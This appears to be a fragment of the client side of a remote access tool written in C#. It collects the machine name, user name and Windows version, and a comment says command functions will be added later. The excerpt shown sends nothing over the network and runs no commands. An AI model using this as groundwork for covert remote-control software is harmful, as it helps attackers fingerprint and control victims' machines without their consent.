using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace CCSURAT_Client
{
    // this class is used to retrieve/store information on the client PC
    // this will also be where command functions are written.
    static class SystemUtils
    {
        public static string SystemInfo()
        {
            string info = "";
            info += Environment.MachineName + "|*|";
            info += Environment.UserName + "|*|";
            info += GetOS();
            return info;
        }
        
        // Get OS version from registry, other way would be translating it from Environment class
        public static string GetOS()
        {
            RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            string OS = (string)reg.GetValue("ProductName");
            return OS;
        }
    }
}
